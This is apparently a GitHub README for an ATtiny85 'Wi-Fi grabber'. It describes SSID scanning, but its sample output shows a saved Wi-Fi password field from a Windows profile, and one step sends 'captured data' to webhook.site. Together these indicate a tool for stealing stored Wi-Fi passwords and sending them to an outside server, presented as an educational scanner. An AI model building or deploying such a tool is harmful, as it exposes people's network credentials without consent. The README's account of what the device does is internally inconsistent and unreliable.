# Wifi_Grabber_Using_Attiny85

A lightweight Wi-Fi data grabber/sniffer tool using the ATtiny85 microcontroller, programmed via the Arduino IDE. Designed for learning about wireless networks and microcontroller programming in constrained environments.

> ⚠️ **Disclaimer**: This project is for **educational purposes only**. Unauthorized access to networks is **illegal and unethical**. Always get explicit permission before scanning or interacting with networks.

<p align="center">
<img src="https://i.ibb.co/jZ2wvX0/NEWEV-AT.png" width="172" height="123">
</p>

## 📦 Features

* 📶 Scans for available Wi-Fi SSIDs (via ESP8266 or similar module).
* 📝 Logs SSIDs and RSSI to serial or EEPROM.
* 🔌 Ultra-low-power design using ATtiny85.
* 🛠️ Programmed using Arduino IDE and USBtinyISP.

## ⚙️ Hardware Requirements

| Component                | Description                                            |
| ------------------------ | ------------------------------------------------------ |
| ATtiny85                 | 8-bit microcontroller (DigiSpark or raw chip)          |
| ESP8266 (ESP-01)         | Wi-Fi module for scanning/grabbing SSIDs               |
| Level shifter            | For safe communication between ATtiny85 and ESP8266    |
| USBtinyISP / Arduino Uno | Programmer for ATtiny85                                |
| 10µF capacitor           | For Arduino ISP stability (if using Uno as programmer) |
| Breadboard & wires       | Prototyping setup                                      |

## 🛠️ Setup Instructions

### 1. Arduino IDE Configuration

* Install the **ATtiny Core**:

  * Go to `File > Preferences > Additional Board URLs` and add:

    ```
    https://raw.githubusercontent.com/damellis/attiny/ide-1.6.x-boards-manager/package_damellis_attiny_index.json
    ```
  * Install **ATtiny by David A. Mellis** via Boards Manager.
* Select:

  * **Board**: ATtiny85
  * **Clock**: 8 MHz (internal)
  * **Programmer**: USBtinyISP (or Arduino as ISP)

### 2. Upload Code

Use Arduino IDE to write and upload code. See 'Wifi_Grab.ino'.

### 3. Sample Output

```
Wi-Fi-User-Name.xml:22:		
	<keyMaterial>Password</keyMaterial>
```

### 4. Website

Use the [webhook](https://webhook.site/) to receive the captured data.

## 🔐 Legal Notice

This project is intended for **educational use only**. Using this code to access or interfere with Wi-Fi networks **without permission** is illegal in many countries.
